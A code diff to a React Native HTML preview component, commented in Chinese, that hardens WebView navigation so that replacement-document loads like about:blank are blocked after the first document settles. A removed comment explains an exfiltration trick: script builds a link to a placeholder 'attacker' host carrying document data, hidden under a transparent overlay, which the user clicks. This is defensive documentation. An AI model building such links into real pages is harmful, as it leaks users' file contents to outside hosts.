@@ -17,8 +17,10 @@
  * 「分享」把文件送到电脑上看。桌面靠 `file://` 的同目录天然没有这个问题。
  * 公网 https 图片 / 字体同样不加载 —— 那是 CSP 关掉出网的代价(见 htmlPreviewCsp)。
  *
- * 导航一律拦下:只有 `about:`(文档自身与页内锚点)放行,**其余一切明确拒绝,且不交给
- * Linking** —— 包含用户主动点击的 http(s) 外链(理由见 interceptHtmlNavigation)。
+ * 导航一律拦下:只放行**同文档锚点**与**首份文档自身的加载**,其余一切明确拒绝、且不交给
+ * Linking —— 包含用户主动点击的 http(s) 外链(理由见 interceptHtmlNavigation)。
+ * 尤其**不放行替换文档的 `about:blank` 导航**:新文档不会再经过 withHtmlPreviewCsp,
+ * 等于把加固过的文档换成一个没有 CSP、没有能力剥离的空文档(review P1)。
  * 出网由 htmlPreviewCsp 在引擎层封锁(导航回调管不到子资源请求)。
  * ⚠️ **不要把这套说成「零出网」**:WebRTC 不受 CSP 管辖,iOS 上仍是残留信道 ——
  * 准确边界与待裁决的取舍见 htmlPreviewCsp 头注的「残留信道」一节。
@@ -31,21 +33,39 @@
  * 会被 RNW 交给 RN `Linking` 试着让系统处理 —— 于是 `tel:` / `mailto:` / 自定义 scheme
  * 会拉起外部应用,把下面这段策略整个绕过去。放到 `['*']` 之后,回调是唯一决策点。
  */
-import { useMemo } from 'react';
+import { useCallback, useMemo, useRef } from 'react';
 import { StyleSheet, View } from 'react-native';
 import { WebView } from 'react-native-webview';
 import type { ShouldStartLoadRequest } from 'react-native-webview/lib/WebViewTypes';
 
+import { interceptHtmlNavigation } from '@/session/htmlNavigationPolicy';
 import { withHtmlPreviewCsp } from '@/session/htmlPreviewCsp';
 
 export function HtmlFileReader({ html, testID }: { html: string; testID?: string }) {
   // CSP 注入放在**渲染载体这一层**,而不是取件那一层:任何进到这个 WebView 的
   // HTML 都必须带策略,不管它有没有同目录资源(见 htmlPreviewCsp 的说明)。
   const guardedHtml = useMemo(() => withHtmlPreviewCsp(html), [html]);
+  // 「首份文档已加载完」的闩 —— 之后任何**替换文档**的导航一律拒绝(见
+  // interceptHtmlNavigation 的说明)。换 html 时重新开闩。
+  const documentSettledRef = useRef(false);
+  // 换文档要重新开闩。用「渲染期比对上一份 html」而不是给 WebView 一个 key:
+  // key 用长度会在「不同内容同长度」时不重挂(弱判据),用整份 html 当 key 又会让
+  // WebView 每次都重建。这里只重置闩,载体不动。
+  const lastHtmlRef = useRef(guardedHtml);
+  if (lastHtmlRef.current !== guardedHtml) {
+    lastHtmlRef.current = guardedHtml;
+    documentSettledRef.current = false;
+  }
+  const interceptNavigation = useCallback(
+    (request: ShouldStartLoadRequest) => interceptHtmlNavigation(request, documentSettledRef.current),
+    [],
+  );
   return (
     <View style={styles.fill} testID={testID}>
       <WebView
-        onShouldStartLoadWithRequest={interceptHtmlNavigation}
+        onShouldStartLoadWithRequest={interceptNavigation}
+        // 首份文档加载完就上闩:此后 about:blank 这类替换文档的导航不再放行。
+        onLoadEnd={() => { documentSettledRef.current = true; }}
         // 见头注:收窄会让 RNW 在回调前把非白名单 URL 交给 Linking,绕过下面的策略。
         originWhitelist={['*']}
         scrollEnabled
@@ -77,39 +97,6 @@ export function HtmlFileReader({ html, testID }: { html: string; testID?: string
   );
 }
 
-/**
- * 唯一的导航决策点(originWhitelist 已放到 `['*']`,所有请求都会先到这里)。
- *
- * 两档,默认拒绝:
- *  - `about:` —— 文档自身(`source={{ baseUrl: 'about:blank' }}`)与页内锚点,放行;
- *  - **其余一切** —— 拒绝,且**不调 Linking**(不 import 它,守卫用例钉住)。
- *
- * ── 为什么连「用户点击的 http(s) 外链」也不放(review P1,曾经放过) ──────────
- * 页面里的 JavaScript 是开启的(CSP 允许 `script-src 'unsafe-inline'`,不然自包含产物的
- * 交互全废),而作者脚本能读到整份文档 —— 包括栈上一层内联进来的同目录资源字节。它可以把
- * 这些内容拼进一个真实的 `<a href="https://attacker/?d=…">`(甚至铺一层全屏透明覆盖层),
- * 用户随手一点就命中 `navigationType === 'click'`——数据在用户看见浏览器之前就已经发出去了。
- *
- * **CSP 挡不住这条**:它管子资源与表单(`connect-src` / `img-src` / `form-action`),
- * 顶层导航不在其控制范围内(`navigate-to` 指令已从 CSP3 移除,两端都不实现)。所以
- * 「点击门」只能挡住程序化导航,挡不住脚本**构造出的、由用户点击触发**的 URL。
- *
- * 两条候选补救都不划算:
- *  - **弹确认框**:要用户对着一条 2KB base64 的 URL 判断安全性,是安全剧场;
- *  - **静态 href 白名单**(只放原文里字面存在的 URL):挡得住,但要引入 URL 归一化
- *    (HTML 实体、百分号编码、尾斜杠),归一化对不上就变成「合法外链静默点不开」。
- * 而这条能力**本来就只在 iOS 上存在** —— Android 侧 RNW 的 `createWebViewEvent` 根本不设
- * `navigationType`,那边一直拿不准、一直是拒绝。删掉它是把两端对齐,不是砍掉一个统一功能。
- *
- * 与本 PR 已经接受的取舍也一致:CSP 让公网 https 图片 / 字体在预览里不加载,预览本就不联网;
- * 在那个前提下还留一条**用户可触发**的外送信道没有道理。外链的退路是工具栏「分享」把文件
- * 送到电脑或浏览器里打开,或切「源码」态自己看 URL。
- */
-function interceptHtmlNavigation(request: ShouldStartLoadRequest): boolean {
-  const url = request.url ?? '';
-  if (url === 'about:blank' || url.startsWith('about:')) return true;
-  return false;
-}
 
 const styles = StyleSheet.create({
   fill: { flex: 1 },
